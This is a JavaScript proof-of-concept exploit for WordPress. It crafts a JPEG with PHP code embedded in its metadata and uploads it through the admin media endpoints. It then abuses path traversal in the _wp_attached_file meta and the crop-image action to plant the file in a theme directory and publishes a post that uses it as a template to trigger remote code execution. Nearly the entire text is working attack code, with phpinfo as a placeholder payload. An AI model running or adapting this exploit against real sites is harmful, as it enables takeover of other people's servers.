
var wpnonce = &#039;&#039;;
var ajaxnonce = &#039;&#039;;
var wp_attached_file = &#039;&#039;;
var imgurl = &#039;&#039;;
var postajaxdata = &#039;&#039;;
var post_id = 0;
var cmd = &#039;<?php phpinfo();/*&#039;;
var cmdlen = cmd.length
var payload = &#039;\xff\xd8\xff\xed\x004Photoshop 3.0\x008BIM\x04\x04&#039;+&#039;\x00&#039;.repeat(5)+&#039;\x17\x1c\x02\x05\x00\x07PAYLOAD\x00\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00`\x00`\x00\x00\xff\xdb\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\x0a\x10\x0a\x0a\x09\x09\x0a\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a\x1d%\x1f\x1a\x1b#\x1c\x16\x16 , #&\x27)*)\x19\x1f-0-(0%()(\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x14\x00\x01&#039;+&#039;\x00&#039;.repeat(15)+&#039;\x08\xff\xc4\x00\x14\x10\x01&#039;+&#039;\x00&#039;.repeat(16)+&#039;\xff\xda\x00\x08\x01\x01\x00\x00?\x00T\xbf\xff\xd9&#039;;
var img = payload.replace(&#039;\x07PAYLOAD&#039;, String.fromCharCode(cmdlen) + cmd);
var byteArray = Uint8Array.from(img, function(c){return c.codePointAt(0);});
var attachurl = &#039;/wp-admin/media-new.php&#039;;
var uploadurl = &#039;/wp-admin/async-upload.php&#039;;
var editattachurl = &#039;/wp-admin/post.php?post=PID&action=edit&#039;;
var editposturl = &#039;/wp-admin/post.php&#039;;
var addposturl = &#039;/wp-admin/post-new.php&#039;;
var cropurl = &#039;/wp-admin/admin-ajax.php&#039;;
console.log("Get wpnonce token.");
jQuery.get(attachurl, function(data) {
    wpnonce = jQuery(data).find(&#039;#file-form #_wpnonce&#039;).val();
    if(wpnonce) {
        console.log("Success! wpnonce: " + wpnonce);
        var postdata = new FormData();
        postdata.append(&#039;name&#039;, &#039;ebaldremal.jpg&#039;);
        postdata.append(&#039;post_id&#039;, post_id);
        postdata.append(&#039;_wpnonce&#039;, wpnonce);
        postdata.append(&#039;short&#039;, 1);
        // file
        var phpimage = new File([byteArray], &#039;ebaldremal.jpg&#039;);
        postdata.append(&#039;async-upload&#039;, phpimage);
        console.log("Upload image with shell.");
        jQuery.ajax({
            url: uploadurl,
            data: postdata,
            cache: false,
            contentType: false,
            processData: false,
            method: &#039;POST&#039;,
            success: function(data){
                if(jQuery.isNumeric(data)) {
                    post_id = data;
                    console.log("Success! Attach ID: " + post_id);
                    console.log("Get wpnonce for edit post, ajax_nonce for crop and URL for fun.");
                    jQuery.get(editattachurl.replace(&#039;PID&#039;, post_id), function(data) {
                        var btnid = "#imgedit-open-btn-" + post_id;
                        wpnonce = jQuery(data).find(&#039;#post #_wpnonce&#039;).val();
                        ajaxnonce = jQuery(data).find(btnid).attr(&#039;onclick&#039;).match(/[a-f0-9]{10}/)[0];
                        imgurl = new URL(jQuery(data).find(&#039;#attachment_url&#039;).val());
                        wp_attached_file = imgurl.pathname.match(/uploads\/(.*)/)[1] + "?/any";
                        console.log("Success! wpnonce: " + wpnonce + ", ajaxnonce: " + ajaxnonce);
                        if(wpnonce && ajaxnonce) {
                            console.log("Update _wp_attached_file meta key to: " + wp_attached_file);
                            postdata = {
                                &#039;_wpnonce&#039;: wpnonce,
                                &#039;action&#039;: &#039;editpost&#039;,
                                &#039;post_ID&#039;: post_id,
                                &#039;meta_input[_wp_attached_file]&#039;: wp_attached_file
                            }
                            jQuery.post(editposturl, postdata, function(data){
                                console.log("Success!");
                                console.log("Crop image for create help folder.");
                                postajaxdata = {
                                    &#039;_ajax_nonce&#039;: ajaxnonce,
                                    &#039;action&#039;: &#039;crop-image&#039;,
                                    &#039;id&#039;: post_id,
                                    &#039;cropDetails[width]&#039;: 1,
                                    &#039;cropDetails[height]&#039;: 1
                                }
                                jQuery.post(cropurl, postajaxdata, function(data){
                                    console.log("Success! Help directory created.");
                                    wp_attached_file = imgurl.pathname.match(/uploads\/(.*)/)[1] + "?/../../../../themes/twentynineteen/owned";
                                    console.log("Update _wp_attached_file meta key to: " + wp_attached_file);
                                    postdata = {
                                        &#039;_wpnonce&#039;: wpnonce,
                                        &#039;action&#039;: &#039;editpost&#039;,
                                        &#039;post_ID&#039;: post_id,
                                        &#039;meta_input[_wp_attached_file]&#039;: wp_attached_file
                                    }
                                    jQuery.post(editposturl, postdata, function(data){
                                        console.log("Success!");
                                        console.log("Crop image for create evil jpg image inside twentynineteen theme folder.");
                                        jQuery.post(cropurl, postajaxdata, function(data){
                                            console.log("Success!");
                                            console.log("Get wpnonce for create new post.");
                                            jQuery.get(addposturl, function(data){
                                                console.log("Create new post and use evil jpg image as template.");
                                                if(jQuery(data).find(&#039;form.metabox-base-form&#039;).length) {
                                                    wpnonce = jQuery(data).find(&#039;form.metabox-base-form #_wpnonce&#039;).val();
                                                    post_id = jQuery(data).find(&#039;form.metabox-base-form #post_ID&#039;).val();
                                                } else {
                                                    wpnonce = jQuery(data).find(&#039;#post #_wpnonce&#039;).val();
                                                    post_id = jQuery(data).find(&#039;#post #post_ID&#039;).val();
                                                }
                                                postdata = {
                                                    &#039;_wpnonce&#039;: wpnonce,
                                                    &#039;action&#039;: &#039;editpost&#039;,
                                                    &#039;post_ID&#039;: post_id,
                                                    &#039;post_title&#039;: &#039;RCE-HERE&#039;,
                                                    &#039;visibility&#039;: &#039;public&#039;,
                                                    &#039;publish&#039;: &#039;Publish&#039;,
                                                    &#039;meta_input[_wp_page_template]&#039;: &#039;cropped-owned.jpg&#039;
                                                }
                                                jQuery.post(editposturl, postdata, function(data){
                                                    console.log("Success! Browse post with id = " + post_id + " to trigger RCE.")
                                                    console.log("Trying to open: " + imgurl.origin + "/?p=" + post_id + ")");
                                                    window.open(imgurl.origin + "/?p=" + post_id, &#039;_blank&#039;);
                                                });
                                            });
                                        });
                                    });
                                });
                            });
                        }
                    });
                }
            }
        });
    }
});

